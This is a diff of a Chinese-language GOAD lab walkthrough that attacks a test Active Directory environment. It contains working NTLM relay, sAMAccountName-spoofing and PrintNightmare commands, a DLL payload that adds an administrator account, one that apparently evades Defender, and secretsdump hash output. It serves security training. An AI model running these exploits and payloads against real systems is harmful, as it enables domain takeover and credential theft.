+- --add-computer : 尝试添加新的计算机帐户
+- --delegate-access : 将中继计算机帐户的访问权限委派给指定帐户(启动委派攻击)
 
 现在DNS已经中毒了
+
 ![mitm6-1](part5-mitm6-1.png)
 
 等待 wpad http 查询将请求转发到 ldaps（根据上表结果 http 能够中继到 ldaps，可以重新启动虚拟机以中毒和利用，无需等待）
@@ -3497,7 +3503,7 @@ impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.l
 可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制 meereen DC 连接到服务器上
 要执行强制操作而不是从多种方式上选择，可以使用一体化工具[coercer](https://github.com/p0dalirius/Coercer)
 
-根据[hackndo博客](https://en.hackndo.com/ntlm-relay/)和[thehacker](https://www.thehacker.recipes/ad/movement/ntlm/relay)可以知道SMBv2无法跨协议中继到ldpa(s)上（除非有CVE-2019-1040漏洞）
+根据 [hackndo](https://en.hackndo.com/ntlm-relay/) 和 [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ntlm/relay) 的说明，SMBv2 无法跨协议中继到 LDAP(S)，除非目标受到 CVE-2019-1040 影响。
 
 启动ntlmrelayx，移除mic，跨协议中继到ldpas，创建新的计算机帐户并授予其对受害计算机的委派权限
 
@@ -3616,9 +3622,9 @@ LDAP-CHE... 192.168.56.11   389    WINTERFELL       Channel Binding is set to "N
 
 目前攻克机器：
 
-* north.sevenkingdoms.local
-* castelblack.north.sevenkingdoms.local
-* braavos.essos.local
+- north.sevenkingdoms.local
+- castelblack.north.sevenkingdoms.local
+- braavos.essos.local
 
 参考链接：
 
@@ -3638,7 +3644,7 @@ LDAP-CHE... 192.168.56.11   389    WINTERFELL       Channel Binding is set to "N
 >
 > KDC服务允许使用没有密钥的算法（如MD4、MD5、SHA1或CRC32），这意味着任何用户都可以在不知道任何秘密密钥的情况下伪造一个PAC，并要求KDC将其包含在一个票据中
 >
->受影响的 Windows 域控制器若未安装 KB3011780 等相应安全更新，可能受到该漏洞影响；具体范围应以厂商公告为准。
+> 受影响的 Windows 域控制器若未安装 KB3011780 等相应安全更新，可能受到该漏洞影响；具体范围应以厂商公告为准。
 >
 #### MS14-068 漏洞分析
 
@@ -3685,15 +3691,15 @@ msf6 > use admin/kerberos/ms14_068_kerberos_checksum
 
 #### CVE-2021-42278 简要概述
 
->计算机账户的名称（即sAMAccountName属性）应以$结尾，但之前没有验证过程来确保这一点，结合CVE-2021-42287的滥用，攻击者可以冒充域控制器账户
+> 计算机账户的名称（即sAMAccountName属性）应以$结尾，但之前没有验证过程来确保这一点，结合CVE-2021-42287的滥用，攻击者可以冒充域控制器账户
 
 #### CVE-2021-42287 简要概述
 
->当请求服务票证时，需要先提供 TGT。当 KDC 找不到 TGT 中的客户端账户时，会尝试在账户名末尾加上 $ 后再次查找。发生的情况是：如果为 bob 获取了 TGT，并删除了 bob 用户，那么使用该 TGT 向自己请求另一个用户的服务票证 (S4U2self) 将导致 KDC 在 AD 中查找 bob$。如果域控制器帐户 bob$ 存在，那么 bob (用户) 刚刚获取了 bob$ (域控制器帐户) 的服务票证，就像任何其他用户一样。
+> 当请求服务票证时，需要先提供 TGT。当 KDC 找不到 TGT 中的客户端账户时，会尝试在账户名末尾加上 $ 后再次查找。发生的情况是：如果为 bob 获取了 TGT，并删除了 bob 用户，那么使用该 TGT 向自己请求另一个用户的服务票证 (S4U2self) 将导致 KDC 在 AD 中查找 bob$。如果域控制器帐户 bob$ 存在，那么 bob (用户) 刚刚获取了 bob$ (域控制器帐户) 的服务票证，就像任何其他用户一样。
 >
->具体情况是，如果为bob获取了一个TGT，并且bob用户被删除了，使用该TGT请求将另一个用户的服务票据（S4U2self）时，KDC会在AD中寻找bob$
+> 具体情况是，如果为bob获取了一个TGT，并且bob用户被删除了，使用该TGT请求将另一个用户的服务票据（S4U2self）时，KDC会在AD中寻找bob$
 >
->如果域控制器账户bob\$存在，那么bob（用户）就获得了bob$（域控制器账户）的服务票据
+> 如果域控制器账户bob\$存在，那么bob（用户）就获得了bob$（域控制器账户）的服务票据
 
 #### sAMAccountName spoofing 原理分析
 
@@ -3706,48 +3712,52 @@ msf6 > use admin/kerberos/ms14_068_kerberos_checksum
 3. 通过ldap修改机器账户的sAMAccountName属性为域控，不要添加"$"
 
 4. （AS-REQ）分析AS-REQ阶段数据包
-![AS-REQ](part6-as-req.png)
-    * as-req部分：
-        * PVNO：表示的是Kerberos协议的版本，这里代表使用Kerberos V5
-        * msg-type：消息类型
-        * padata：Pre-authentication Data，预身份认证，是 Kerberos V5 协议的扩展点。通过在 AS-REQ 和 AS-REP 消息的 padata 字段中提供一个或多个预认证消息来执行预认证。
-        * PA-DATA PA-ENC-TIMESTAMP：使用用户hash加密的时间戳，AS收到消息后使用对应hash解密，时间戳在规定范围即认证通过；域内设置"Do not require Kerberos preauthentication"，DC不会有Pre-authentication，这里可能出现的安全问题是AS-REP Roasting。
-        * PA-DATA PA-PAC-REQUEST：Privilege Attribute Certificate，用于验证用户是否有权限访问某服务，这里的include-pac 参数为True，说明申请的TGT是包含PAC的
-    * as-boby部分：
-        * kdc-options：请求生成票据的标志位
-        * cname：进行身份验证的账户名，这里是我们修改后的,为winterfell
-        * sname：被请求服务的名字
-        * etype：加密类型
-5. （AS-REP）分析AS-REP阶段的数据包，此阶段一切正常
-![GOAD 实验截图](part6-as-rep-ticket.png)
-    * ticket->enc-part 加密部分
-        * cname：进行身份验证的账户名，这里是我们修改后的,为winterfell
-        * authorization-data：包含客户端的身份权限信息，也就是包含在PAC当中
 
-    * ticket->enc-part->pac 加密部分
-        * Acct Name：对应的值是用户sAMAccountName
-        * Group RID：对应组的RID，此处为正常RID（Domain Computers 515）修改此处将会导致提权，例如MS14-068
+![AS-REQ](part6-as-req.png)
+    - as-req部分：
+        - PVNO：表示的是Kerberos协议的版本，这里代表使用Kerberos V5
+        - msg-type：消息类型
+        - padata：Pre-authentication Data，预身份认证，是 Kerberos V5 协议的扩展点。通过在 AS-REQ 和 AS-REP 消息的 padata 字段中提供一个或多个预认证消息来执行预认证。
+        - PA-DATA PA-ENC-TIMESTAMP：使用用户hash加密的时间戳，AS收到消息后使用对应hash解密，时间戳在规定范围即认证通过；域内设置"Do not require Kerberos preauthentication"，DC不会有Pre-authentication，这里可能出现的安全问题是AS-REP Roasting。
+        - PA-DATA PA-PAC-REQUEST：Privilege Attribute Certificate，用于验证用户是否有权限访问某服务，这里的include-pac 参数为True，说明申请的TGT是包含PAC的
+    - as-boby部分：
+        - kdc-options：请求生成票据的标志位
+        - cname：进行身份验证的账户名，这里是我们修改后的,为winterfell
+        - sname：被请求服务的名字
+        - etype：加密类型
+5. （AS-REP）分析AS-REP阶段的数据包，此阶段一切正常
+
+![GOAD 实验截图](part6-as-rep-ticket.png)
+    - ticket->enc-part 加密部分
+        - cname：进行身份验证的账户名，这里是我们修改后的,为winterfell
+        - authorization-data：包含客户端的身份权限信息，也就是包含在PAC当中
+
+    - ticket->enc-part->pac 加密部分
+        - Acct Name：对应的值是用户sAMAccountName
+        - Group RID：对应组的RID，此处为正常RID（Domain Computers 515）修改此处将会导致提权，例如MS14-068
 6. 这时候再改回机器账户的sAMAccountName属性
 
 7. （TGS-REQ）查看TGS-REQ的数据包
+
 ![TGS-REQ](part6-tgs-req.png)
-    * PADATA->PA-TGS-REQ->ap-req->ticket： 与AS-REP获取的TGT一致
-    * PA-TGS-REQ->ap-req->authenticator： 通过Logon Session Key 加密的时间戳，保证会话安全
-    * PADATA->PA-FOR-USER：通过 S4U2Self 代表指定用户请求访问自身服务的票据
-    * PADATA->PA-FOR-USER->name：表示要模拟的用户，这里为administrator
-    * sname: 代表请求服务名称，这里我自身winterfell
+    - PADATA->PA-TGS-REQ->ap-req->ticket： 与AS-REP获取的TGT一致
+    - PA-TGS-REQ->ap-req->authenticator： 通过Logon Session Key 加密的时间戳，保证会话安全
+    - PADATA->PA-FOR-USER：通过 S4U2Self 代表指定用户请求访问自身服务的票据
+    - PADATA->PA-FOR-USER->name：表示要模拟的用户，这里为administrator
+    - sname: 代表请求服务名称，这里我自身winterfell
 
 8. （TGS-REP）查看TGS-REP的数据包，可以发现PAC重新生成了，因为KDC寻找不到saMAccountName值为winterfell（被删除了），但是能找到winterfell$(DC)，所以重新生成了高身份的PAC
+
 ![TGS-REP](part6-tgs-rep.png)
-      * 重点看ST中的PAC部分：
-          * Acct Name：对应的值为administrator
-          * Group RID：对应的组已经变成了513（域用户组）
+      - 重点看ST中的PAC部分：
+          - Acct Name：对应的值为administrator
+          - Group RID：对应的组已经变成了513（域用户组）
 
 #### sAMAccountName spoofing 攻击实践
 
 我也是archlinux和exegol的粉丝，我也将尝试linux方式
 
-* 使用cme模块检查域用户创建机器账户配额
+- 使用cme模块检查域用户创建机器账户配额
 
 ```bash
 cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
@@ -3766,13 +3776,13 @@ MAQ         winterfell.north.sevenkingdoms.local 389    WINTERFELL       [*] Get
 MAQ         winterfell.north.sevenkingdoms.local 389    WINTERFELL       MachineAccountQuota: 10
 ```
 
-* 添加新计算机
+- 添加新计算机
 
 ```bash
 addcomputer.py -computer-name 'nopac1$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 
-* -domain-netbios ： 域 NetBIOS 名称（如果 DC 具有多个域，则为必需）
+- -domain-netbios ： 域 NetBIOS 名称（如果 DC 具有多个域，则为必需）
 
 ```bash
 Impacket for Exegol - v0.10.1.dev1+20230719.222135.7a0ec36 - Copyright 2022 Fortra - forked by ThePorgs
@@ -3780,7 +3790,7 @@ Impacket for Exegol - v0.10.1.dev1+20230719.222135.7a0ec36 - Copyright 2022 Fort
 [*] Successfully added machine account nopac1$ with password ComputerPassword.
 ```
 
-* 清除我们新计算机的 SPN
+- 清除我们新计算机的 SPN
 
 ```bash
 addspn.py --clear -t 'nopac1$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
@@ -3798,7 +3808,7 @@ DN: CN=nopac1,CN=Computers,DC=north,DC=sevenkingdoms,DC=local - STATUS: Read - R
 [+] SPN Modified successfully
 ```
 
-* 重命名计算机（计算机 -> DC）
+- 重命名计算机（计算机 -> DC）
 
 ```bash
 renameMachine.py -current-name 'nopac1$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
@@ -3814,13 +3824,13 @@ Impacket for Exegol - v0.10.1.dev1+20230719.222135.7a0ec36 - Copyright 2022 Fort
 
 > 在执行renameMachine脚本会有报错<https://github.com/Ridter/nopac1/issues/18>
 
-* 获取 TGT
+- 获取 TGT
 
 ```bash
 impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
 ```
 
-* 恢复计算机名
+- 恢复计算机名
 
 ```bash
 renameMachine.py -current-name 'winterfell' -new-name 'pac1$' north.sevenkingdoms.local/jon.snow:iknownothing
@@ -3833,9 +3843,9 @@ Impacket for Exegol - v0.10.1.dev1+20230719.222135.7a0ec36 - Copyright 2022 Fort
 [*] Target object modified successfully!
 ```
 
-* 利用之前获得的TGT票据，通过S4U2self协议向DC请求ST
+- 利用之前获得的TGT票据，通过S4U2self协议向DC请求ST
 
->S4U2Self: 服务A通过S4U2Self协议，可以从域服务器获取账号B访问应用服务器A的TGS票据，就像账号B主动从域服务器获取一个访问服务A的TGS票据一样。可以理解为通过该协议，可以获取域内任意账号访问服务A的TGS票据，过程中不需要账号B认证到域
+> S4U2Self: 服务A通过S4U2Self协议，可以从域服务器获取账号B访问应用服务器A的TGS票据，就像账号B主动从域服务器获取一个访问服务A的TGS票据一样。可以理解为通过该协议，可以获取域内任意账号访问服务A的TGS票据，过程中不需要账号B认证到域
 
 ```bash
 getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
@@ -3920,7 +3930,7 @@ TGS_REQ:
 [*] Saving ticket in administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
 ```
 
-* 提供ST进行DCSync（卷影拷贝服务 读取ntds.dit）
+- 提供ST进行DCSync（卷影拷贝服务 读取ntds.dit）
 
 ```bash
 export KRB5CCNAME=administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
@@ -4045,9 +4055,9 @@ Print Spooler 是 Microsoft 内置的管理打印作业的服务，默认情况�
 
 打印机后台处理程序注册了 3 个 RPC 协议：
 
-* MS-RPRN：Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间同步进行的打印作业处理和打印系统管理的通信
-* MS-PAR：Microsoft 的打印系统异步远程协议。它具有与 MS-RPRN 相同的功能，但以异步方式工作
-* MS-PAN：Microsoft 的打印系统异步通知协议。用于从打印服务器接收打印状态通知，并将服务器请求的响应发送回服务器
+- MS-RPRN：Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间同步进行的打印作业处理和打印系统管理的通信
+- MS-PAR：Microsoft 的打印系统异步远程协议。它具有与 MS-RPRN 相同的功能，但以异步方式工作
+- MS-PAN：Microsoft 的打印系统异步通知协议。用于从打印服务器接收打印状态通知，并将服务器请求的响应发送回服务器
 
 PrintNightmare 指的是 RCE（远程命令执行）漏洞。如果易受攻击的机器配置为拒绝远程连接，则此漏洞仍可能在 LPE（本地特权提升）上下文中被利用
 
@@ -4065,7 +4075,7 @@ PrintNightmare 指的是 RCE（远程命令执行）漏洞。如果易受攻击�
 
 为了利用 printnightmare，我们将首先检查spooler是否在目标上处于活动状态
 
-* 使用cme扫描
+- 使用cme扫描
 
 ```bash
 cme smb 192.168.56.10-23 -M spooler
@@ -4084,7 +4094,7 @@ SPOOLER     192.168.56.23   445    BRAAVOS          Spooler service enabled
 SPOOLER     192.168.56.12   445    MEEREEN          Spooler service enabled
 ```
 
-* 使用 impacket-rpcdump
+- 使用 impacket-rpcdump
 
 ```bash
 rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
@@ -4097,9 +4107,9 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 
 ##### 准备 dll
 
-* 准备利用dll
-* 将创建一个用户并将其添加为本地管理员
-* 创建文件 nightmare.c：
+- 准备利用dll
+- 将创建一个用户并将其添加为本地管理员
+- 创建文件 nightmare.c：
 
 ```c
 #include <windows.h>
@@ -4130,7 +4140,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-* 编译
+- 编译
 
 ```bash
 x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
@@ -4138,19 +4148,19 @@ x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
 
 ##### 在旧的Windows Server 2016 上攻击(meereen 192.168.56.12)
 
-* 克隆仓库
+- 克隆仓库
 
 ```bash
 git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
 ```
 
-* 准备smb共享
+- 准备smb共享
 
 ```bash
 smbserver.py -smb2support ATTACKERSHARE .
 ```
 
-* 检查是否存在pnightmare用户
+- 检查是否存在pnightmare用户
 
 ```bash
 cme smb meereen.essos.local -u pnightmare -p "Passw0rd123."
@@ -4161,8 +4171,8 @@ SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Stan
 SMB         essos.local     445    MEEREEN          [-] essos.local\pnightmare:Passw0rd123. STATUS_LOGON_FAILURE
 ```
 
-* 攻击Braavos
-  * Braavos 是最新的 Windows Server 2016，该漏洞将不起作用（如果在North 域攻击castelblack 服务器，也会出现同样的错误）
+- 攻击Braavos
+  - Braavos 是最新的 Windows Server 2016，该漏洞将不起作用（如果在North 域攻击castelblack 服务器，也会出现同样的错误）
 
 ```bash
 python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@braavos.essos.local '\\192.168.56.106\ATTACKERSHARE\nightmare.dll'
@@ -4190,7 +4200,7 @@ SMB         braavos.essos.local 445    BRAAVOS          [*] Windows Server 2016 
 SMB         braavos.essos.local 445    BRAAVOS          [+] essos.local\pnightmare:Passw0rd123.
 ```
 
-* 攻击 Meereen
+- 攻击 Meereen
 
 ```bash
 cme smb meereen.essos.local -u pnightmare -p "Passw0rd123."
@@ -4297,20 +4307,22 @@ SEVENKINGDOMS$:des-cbc-md5:fd4389cb1fae10d0
 [*] Cleaning up...
 ```
 
->Wait, you use domain connection instead of –local-auth with cme no ?
+> Wait, you use domain connection instead of –local-auth with cme no ?
 >
->是的，这是因为meereen是一个域控制器
->域控制器没有内置域或帐户域。 此外，这些系统不使用 SAM 数据库，而是使用 Microsoft Active Directory 目录服务来存储帐户访问信息
->参见 <https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domains>
+> 是的，这是因为meereen是一个域控制器
+> 域控制器没有内置域或帐户域。 此外，这些系统不使用 SAM 数据库，而是使用 Microsoft Active Directory 目录服务来存储帐户访问信息
+> 参见 <https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domains>
 
 ##### 在windows server 2019 (winterfell 192.168.56.11)上攻击
 
-* 现在在易受攻击的 Windows Server 2019 上尝试相同的漏洞利用
-* 它也有效，但用户不在管理员组中:(
-* 与漏洞无关，只是我们的 dll 将用户添加为管理员，当用户设置为管理员时被捕获
+- 现在在易受攻击的 Windows Server 2019 上尝试相同的漏洞利用
+- 它也有效，但用户不在管理员组中:(
+- 与漏洞无关，只是我们的 dll 将用户添加为管理员，当用户设置为管理员时被捕获
+
 ![defender](part6-defender.png)
-* 好（事情）要知道：在发生一些故障后，后台打印程序服务将被防御者停止，并且在有人重新启动服务器或后台打印程序服务之前，您将无法再利用该服务。
-* 让我们用另一个代码更改有效负载（来源：<https://github.com/newsoft/adduser）>
+
+- 好（事情）要知道：在发生一些故障后，后台打印程序服务将被防御者停止，并且在有人重新启动服务器或后台打印程序服务之前，您将无法再利用该服务。
+- 下面使用另一段代码修改有效负载，来源：[newsoft/adduser](https://github.com/newsoft/adduser)。
 
 ```c
 /*
@@ -4443,8 +4455,8 @@ int main()
 }
 ```
 
-* 使用此有效负载，我们可以绕过防御者并将我们的用户添加为管理员
-* 编译
+- 使用此有效负载，我们可以绕过防御者并将我们的用户添加为管理员
+- 编译
 
 ```bash
 x86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32
@@ -4467,7 +4479,7 @@ python3 CVE-2021-1675.py  north.sevenkingdoms.local/jon.snow:'iknownothing'@wint
 [+] Exploit Completed
 ```
 
-```
+```bash
 impacket-secretsdump north.sevenkingdoms.local/pnightmare2:'Test123456789!'@192.168.56.11
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
